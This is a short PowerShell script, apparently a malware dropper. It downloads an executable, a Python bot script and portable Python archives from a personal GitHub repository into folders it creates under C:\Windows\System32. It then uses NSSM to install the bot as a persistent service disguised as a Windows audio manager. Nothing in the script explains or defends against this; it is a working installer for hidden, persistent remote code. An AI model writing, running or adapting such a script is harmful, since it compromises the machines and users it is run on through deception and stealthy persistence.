$destino = 'C:\Windows\System32\ap32\nssm.exe'
$destino2 = 'C:\Windows\System32\ap32\bot.py'
$destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
$destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
$destino5 = 'C:\Windows\System32\ap32\Res-PE\scripts.zip'

New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory
New-Item -Path "C:\Windows\System32\ap32\Res-PE" -ItemType Directory

Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/nssm.exe?dl=1" -OutFile $destino
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/bot.py?dl=1" -OutFile $destino2
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64.zip?dl=1" -OutFile $destino3
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64_2.zip?dl=1" -OutFile $destino4
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/scripts.zip?dl=1" -OutFile $destino5

Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\ap32" -Force
Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\ap32" -Force
Expand-Archive -Path $destino5 -DestinationPath "C:\Windows\System32\ap32\Res-PE" -Force

C:\Windows\System32\ap32\nssm.exe install "Gestor Primario de Audio do Windows" "C:\Windows\System32\re-as\WPy64\python\python.exe C:\Windows\System32\ap32\bot.py"
C:\Windows\System32\ap32\nssm.exe restart "Gestor Primario de Audio do Windows"

exit
